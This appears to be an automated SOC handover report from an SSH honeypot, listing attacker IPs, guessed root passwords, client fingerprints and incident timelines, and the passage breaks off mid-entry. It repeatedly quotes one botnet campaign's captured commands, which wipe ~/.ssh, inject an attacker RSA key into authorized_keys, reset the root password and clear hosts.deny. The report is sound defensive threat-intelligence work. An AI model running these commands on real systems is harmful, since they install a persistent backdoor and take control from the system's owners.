# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-23 |
| **Generated At** | 2026-04-23T15:58:54Z |
| **Shift Time** | 15:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **108** |
| Confirmed Threats | **77** |
| False Positives Filtered | **31** (28.7%) |
| Unique Attacker IPs | **10** |
| Countries of Origin | **7** |
| High Severity Cases | **33** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **75** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **92** |
| Unique Credential Pairs | **34** |
| Unique Usernames | **22** |
| Unique Passwords | **33** |
| Successful Auth Pairs | **21** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 33 |
| `345gs5662d34` | 15 |
| `ubuntu` | 8 |
| `admin1234` | 3 |
| `minecraft` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 15 |
| `3245gs5662d34` | 15 |
| `123` | 4 |
| `admin1234` | 3 |
| `Qwerty123` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 15 |
| `root` | `3245gs5662d34` | 15 |
| `admin1234` | `admin1234` | 3 |
| `minecraft` | `Qwerty123` | 3 |
| `tester` | `tester123!` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `QWE1234567890` | `121.122.65.136` | 2026-04-23T13:54:07 |
| `root` | `3245gs5662d34` | `121.122.65.136` | 2026-04-23T13:54:09 |
| `root` | `root1234567@#` | `43.100.61.6` | 2026-04-23T15:13:34 |
| `root` | `3245gs5662d34` | `43.100.61.6` | 2026-04-23T15:13:38 |
| `root` | `------fuck------` | `112.30.72.108` | 2026-04-23T15:14:06 |
| `root` | `root2026..` | `43.100.61.6` | 2026-04-23T15:14:22 |
| `root` | `1234.qwer` | `177.91.180.81` | 2026-04-23T15:15:55 |
| `root` | `3245gs5662d34` | `177.91.180.81` | 2026-04-23T15:16:02 |
| `root` | `qwer1234.` | `43.100.61.6` | 2026-04-23T15:17:47 |
| `root` | `4rfv$RFV4rfv` | `43.100.61.6` | 2026-04-23T15:18:35 |
| `root` | `ZAQ!2wsx54321` | `43.100.61.6` | 2026-04-23T15:23:25 |
| `root` | `root1234567@#` | `177.91.180.81` | 2026-04-23T15:25:42 |
| `root` | `QwerQwer12345` | `43.100.61.6` | 2026-04-23T15:27:26 |
| `root` | `QwerQwer12345` | `177.91.180.81` | 2026-04-23T15:27:57 |
| `root` | `root2026..` | `14.103.105.254` | 2026-04-23T15:29:57 |
| `root` | `qwer1234.` | `177.91.180.81` | 2026-04-23T15:32:14 |
| `root` | `1234.qwer` | `43.100.61.6` | 2026-04-23T15:32:59 |
| `root` | `root1234567@#` | `14.103.105.254` | 2026-04-23T15:33:09 |
| `root` | `root2026..` | `177.91.180.81` | 2026-04-23T15:34:21 |
| `root` | `4rfv$RFV4rfv` | `177.91.180.81` | 2026-04-23T15:38:40 |
| `root` | `ZAQ!2wsx54321` | `177.91.180.81` | 2026-04-23T15:39:45 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **108** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 99 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 51 | 2 |
| `af8223ac9914...` | libssh-based | 47 | 2 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 51 | 2 | Modern SSH client |
| `af8223ac9914...` | libssh | 47 | 2 | libssh-based |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 15 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:xYOgzV2BUq3q"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.105.254`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `177.91.180.81`, `121.122.65.136`, `43.100.61.6`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **10** |
| Unique ASNs | **10** |
| High-Risk ASNs | **5** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | MEDIUM |
| `AS9981` | Saero Network Service LTD | 1 | HIGH |
| `AS28306` | Voluy Telecom Eireli | 1 | HIGH |
| `AS17622` | China Unicom Guangzhou network | 1 | LOW |
| `AS136525` | Wancom (Pvt) Ltd. | 1 | LOW |
| `AS9534` | Binariang Berhad | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (33)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b9885d551273

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:54 |
| **Last Seen** | 2026-04-23 13:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:54:06` | `cowrie.session.connect` |
| `2026-04-23 13:54:06` | `cowrie.client.version` |
| `2026-04-23 13:54:06` | `cowrie.client.kex` |
| `2026-04-23 13:54:07` | `cowrie.login.success` |
| `2026-04-23 13:54:07` | `cowrie.session.params` |
| `2026-04-23 13:54:07` | `cowrie.command.input` |
| `2026-04-23 13:54:07` | `cowrie.command.failed` |
| `2026-04-23 13:54:07` | `cowrie.log.closed` |
| `2026-04-23 13:54:07` | `cowrie.session.params` |
| `2026-04-23 13:54:07` | `cowrie.command.input` |
| `2026-04-23 13:54:07` | `cowrie.session.file_download` |
| `2026-04-23 13:54:07` | `cowrie.log.closed` |
| `2026-04-23 13:54:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cbf6453c94d

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:54 |
| **Last Seen** | 2026-04-23 13:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:54:09` | `cowrie.session.connect` |
| `2026-04-23 13:54:09` | `cowrie.client.version` |
| `2026-04-23 13:54:09` | `cowrie.client.kex` |
| `2026-04-23 13:54:09` | `cowrie.login.success` |
| `2026-04-23 13:54:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-348f891de2e2

| Field | Detail |
|---|---|
| **Source IP** | `43.100.61[.]6` |
| **First Seen** | 2026-04-23 15:13 |
| **Last Seen** | 2026-04-23 15:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:13:34` | `cowrie.session.connect` |
| `2026-04-23 15:13:34` | `cowrie.client.version` |
| `2026-04-23 15:13:34` | `cowrie.client.kex` |
| `2026-04-23 15:13:34` | `cowrie.login.success` |
| `2026-04-23 15:13:35` | `cowrie.session.params` |
| `2026-04-23 15:13:35` | `cowrie.command.input` |
| `2026-04-23 15:13:35` | `cowrie.command.failed` |
| `2026-04-23 15:13:35` | `cowrie.log.closed` |
| `2026-04-23 15:13:35` | `cowrie.session.params` |
| `2026-04-23 15:13:35` | `cowrie.command.input` |
| `2026-04-23 15:13:35` | `cowrie.session.file_download` |
| `2026-04-23 15:13:35` | `cowrie.log.closed` |
| `2026-04-23 15:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.61[.]6` to AbuseIPDB if not already reported
- [ ] Block `43.100.61[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-734335a4d63f

| Field | Detail |
|---|---|
| **Source IP** | `43.100.61[.]6` |
| **First Seen** | 2026-04-23 15:13 |
| **Last Seen** | 2026-04-23 15:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:13:37` | `cowrie.session.connect` |
| `2026-04-23 15:13:37` | `cowrie.client.version` |
| `2026-04-23 15:13:37` | `cowrie.client.kex` |
| `2026-04-23 15:13:38` | `cowrie.login.success` |
| `2026-04-23 15:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.61[.]6` to AbuseIPDB if not already reported
- [ ] Block `43.100.61[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff81d570493d

| Field | Detail |
|---|---|
| **Source IP** | `112.30.72[.]108` |
| **First Seen** | 2026-04-23 15:14 |
| **Last Seen** | 2026-04-23 15:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:14:04` | `cowrie.session.connect` |
| `2026-04-23 15:14:05` | `cowrie.client.version` |
| `2026-04-23 15:14:05` | `cowrie.client.kex` |
| `2026-04-23 15:14:06` | `cowrie.login.success` |
| `2026-04-23 15:14:07` | `cowrie.session.params` |
| `2026-04-23 15:14:07` | `cowrie.command.input` |
| `2026-04-23 15:14:07` | `cowrie.log.closed` |
| `2026-04-23 15:14:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.30.72[.]108` to AbuseIPDB if not already reported
- [ ] Block `112.30.72[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-814ee86f39ab

| Field | Detail |
|---|---|
| **Source IP** | `43.100.61[.]6` |
| **First Seen** | 2026-04-23 15:14 |
| **Last Seen** | 2026-04-23 15:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:14:22` | `cowrie.session.connect` |
| `2026-04-23 15:14:22` | `cowrie.client.version` |
| `2026-04-23 15:14:22` | `cowrie.client.kex` |
| `2026-04-23 15:14:22` | `cowrie.login.success` |
| `2026-04-23 15:14:23` | `cowrie.session.params` |
| `2026-04-23 15:14:23` | `cowrie.command.input` |
| `2026-04-23 15:14:23` | `cowrie.command.failed` |
| `2026-04-23 15:14:23` | `cowrie.log.closed` |
| `2026-04-23 15:14:23` | `cowrie.session.params` |
| `2026-04-23 15:14:23` | `cowrie.command.input` |
| `2026-04-23 15:14:23` | `cowrie.session.file_download` |
| `2026-04-23 15:14:23` | `cowrie.log.closed` |
| `2026-04-23 15:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.61[.]6` to AbuseIPDB if not already reported
- [ ] Block `43.100.61[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cbb716e4a4f

| Field | Detail |
|---|---|
| **Source IP** | `43.100.61[.]6` |
| **First Seen** | 2026-04-23 15:14 |
| **Last Seen** | 2026-04-23 15:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:14:25` | `cowrie.session.connect` |
| `2026-04-23 15:14:25` | `cowrie.client.version` |
| `2026-04-23 15:14:25` | `cowrie.client.kex` |
| `2026-04-23 15:14:25` | `cowrie.login.success` |
| `2026-04-23 15:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.61[.]6` to AbuseIPDB if not already reported
- [ ] Block `43.100.61[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7c9e8a6a9a7

| Field | Detail |
|---|---|
| **Source IP** | `177.91.180[.]81` |
| **First Seen** | 2026-04-23 15:15 |
| **Last Seen** | 2026-04-23 15:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:15:53` | `cowrie.session.connect` |
| `2026-04-23 15:15:53` | `cowrie.client.version` |
| `2026-04-23 15:15:54` | `cowrie.client.kex` |
| `2026-04-23 15:15:55` | `cowrie.login.success` |
| `2026-04-23 15:15:56` | `cowrie.session.params` |
| `2026-04-23 15:15:56` | `cowrie.command.input` |
| `2026-04-23 15:15:56` | `cowrie.command.failed` |
| `2026-04-23 15:15:56` | `cowrie.log.closed` |
| `2026-04-23 15:15:57` | `cowrie.session.params` |
| `2026-04-23 15:15:57` | `cowrie.command.input` |
| `2026-04-23 15:15:57` | `cowrie.session.file_download` |
| `2026-04-23 15:15:57` | `cowrie.log.closed` |
| `2026-04-23 15:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.91.180[.]81` to AbuseIPDB if not already reported
- [ ] Block `177.91.180[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c0121d2fda2

| Field | Detail |
|---|---|
| **Source IP** | `177.91.180[.]81` |
| **First Seen** | 2026-04-23 15:16 |
| **Last Seen** | 2026-04-23 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:16:01` | `cowrie.session.connect` |
| `2026-04-23 15:16:01` | `cowrie.client.version` |
| `2026-04-23 15:16:01` | `cowrie.client.kex` |
| `2026-04-23 15:16:02` | `cowrie.login.success` |
| `2026-04-23 15:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.91.180[.]81` to AbuseIPDB if not already reported
- [ ] Block `177.91.180[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-330a6bf582c8

| Field | Detail |
|---|---|
| **Source IP** | `43.100.61[.]6` |
| **First Seen** | 2026-04-23 15:17 |
| **Last Seen** | 2026-04-23 15:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:17:47` | `cowrie.session.connect` |
| `2026-04-23 15:17:47` | `cowrie.client.version` |
| `2026-04-23 15:17:47` | `cowrie.client.kex` |
| `2026-04-23 15:17:47` | `cowrie.login.success` |
| `2026-04-23 15:17:47` | `cowrie.session.params` |
| `2026-04-23 15:17:47` | `cowrie.command.input` |
| `2026-04-23 15:17:47` | `cowrie.command.failed` |
| `2026-04-23 15:17:48` | `cowrie.log.closed` |
| `2026-04-23 15:17:48` | `cowrie.session.params` |
| `2026-04-23 15:17:48` | `cowrie.command.input` |
| `2026-04-23 15:17:48` | `cowrie.session.file_download` |
| `2026-04-23 15:17:48` | `cowrie.log.closed` |
| `2026-04-23 15:17:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.61[.]6` to AbuseIPDB if not already reported
- [ ] Block `43.100.61[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-216e398ee2cc

| Field | Detail |
|---|---|
| **Source IP** | `43.100.61[.]6` |
| **First Seen** | 2026-04-23 15:17 |
| **Last Seen** | 2026-04-23 15:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:17:50` | `cowrie.session.connect` |
| `2026-04-23 15:17:50` | `cowrie.client.version` |
| `2026-04-23 15:17:50` | `cowrie.client.kex` |
| `2026-04-23 15:17:50` | `cowrie.login.success` |
| `2026-04-23 15:17:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.61[.]6` to AbuseIPDB if not already reported
- [ ] Block `43.100.61[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f244e635eba2

| Field | Detail |
|---|---|
| **Source IP** | `43.100.61[.]6` |
| **First Seen** | 2026-04-23 15:18 |
| **Last Seen** | 2026-04-23 15:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:18:34` | `cowrie.session.connect` |
| `2026-04-23 15:18:34` | `cowrie.client.version` |
| `2026-04-23 15:18:34` | `cowrie.client.kex` |
| `2026-04-23 15:18:35` | `cowrie.login.success` |
| `2026-04-23 15:18:35` | `cowrie.session.params` |
| `2026-04-23 15:18:35` | `cowrie.command.input` |
| `2026-04-23 15:18:35` | `cowrie.command.failed` |
| `2026-04-23 15:18:35` | `cowrie.log.closed` |
| `2026-04-23 15:18:36` | `cowrie.session.params` |
| `2026-04-23 15:18:36` | `cowrie.command.input` |
| `2026-04-23 15:18:36` | `cowrie.session.file_download` |
| `2026-04-23 15:18:36` | `cowrie.log.closed` |
| `2026-04-23 15:18:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.61[.]6` to AbuseIPDB if not already reported
- [ ] Block `43.100.61[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26d013308878

| Field | Detail |
|---|---|
| **Source IP** | `43.100.61[.]6` |
| **First Seen** | 2026-04-23 15:18 |
